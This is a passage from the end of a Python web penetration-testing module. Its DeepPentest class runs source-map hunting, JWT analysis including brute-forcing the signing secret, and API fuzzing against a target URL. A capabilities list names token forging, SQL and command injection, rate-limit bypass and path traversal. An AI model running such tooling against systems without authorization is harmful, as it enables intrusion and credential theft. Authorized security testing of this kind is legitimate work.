            results["error"] = str(e)

        return results


# =============================================================================
# UNIFIED DEEP PENTEST
# =============================================================================

class DeepPentest:
    """
    Unified deep penetration testing toolkit.

    Combines all advanced testing capabilities.
    """

    def __init__(self, timeout: int = 15):
        self.timeout = timeout
        self.jwt_analyzer = JWTAnalyzer()
        self.source_map_hunter = SourceMapHunter(timeout)
        self.api_fuzzer = APIFuzzer(timeout)
        self.rate_limit_bypass = RateLimitBypass(timeout)
        self.file_upload_tester = FileUploadTester(timeout)
        self.all_findings: List[DeepFinding] = []

    def full_deep_scan(
        self,
        base_url: str,
        js_urls: List[str] = None,
        api_endpoints: List[str] = None,
        jwt_token: str = None
    ) -> Dict[str, Any]:
        """
        Run comprehensive deep penetration test.

        Args:
            base_url: Target base URL
            js_urls: JavaScript URLs to analyze
            api_endpoints: API endpoints to test
            jwt_token: JWT token to analyze

        Returns:
            Complete test results
        """
        results = {
            "target": base_url,
            "source_maps": None,
            "jwt_analysis": None,
            "api_fuzzing": [],
            "rate_limit_bypass": [],
            "all_findings": []
        }

        # Source map hunting
        results["source_maps"] = self.source_map_hunter.hunt_source_maps(base_url, js_urls)
        self.all_findings.extend(self.source_map_hunter.findings)

        # JWT analysis
        if jwt_token:
            results["jwt_analysis"] = self.jwt_analyzer.analyze_token(jwt_token)

            # Try to crack weak secret
            secret = self.jwt_analyzer.brute_force_secret(jwt_token)
            if secret:
                results["jwt_analysis"]["cracked_secret"] = secret

            self.all_findings.extend(self.jwt_analyzer.findings)

        # API fuzzing
        if api_endpoints:
            for endpoint in api_endpoints[:10]:  # Limit for safety
                url = urljoin(base_url, endpoint)
                fuzz_result = self.api_fuzzer.fuzz_endpoint(url)
                results["api_fuzzing"].append(fuzz_result)

            self.all_findings.extend(self.api_fuzzer.findings)

        # Compile all findings
        results["all_findings"] = [f.to_dict() for f in self.all_findings]
        results["summary"] = {
            "critical": len([f for f in self.all_findings if f.severity == Severity.CRITICAL]),
            "high": len([f for f in self.all_findings if f.severity == Severity.HIGH]),
            "medium": len([f for f in self.all_findings if f.severity == Severity.MEDIUM]),
            "low": len([f for f in self.all_findings if f.severity == Severity.LOW]),
            "info": len([f for f in self.all_findings if f.severity == Severity.INFO]),
        }

        return results

    @staticmethod
    def get_capabilities() -> Dict[str, str]:
        """List all deep pentest capabilities"""
        return {
            "jwt_analysis": "JWT decode, algorithm confusion, secret brute force, token forging",
            "source_map_hunting": "Aggressive .map hunting, webpack extraction, secret scanning",
            "api_fuzzing": "SQLi, XSS, SSTI, XXE, command injection testing",
            "method_tampering": "HTTP verb tampering, content-type confusion",
            "rate_limit_bypass": "Header manipulation, URL variation, timing attacks",
            "file_upload": "Extension bypass, path traversal, presigned URL exploitation"
        }


# Export all classes
__all__ = [
    "Severity",
    "DeepFinding",
    "JWTAnalyzer",
    "SourceMapHunter",
    "APIFuzzer",
    "RateLimitBypass",
    "FileUploadTester",
    "DeepPentest",
]
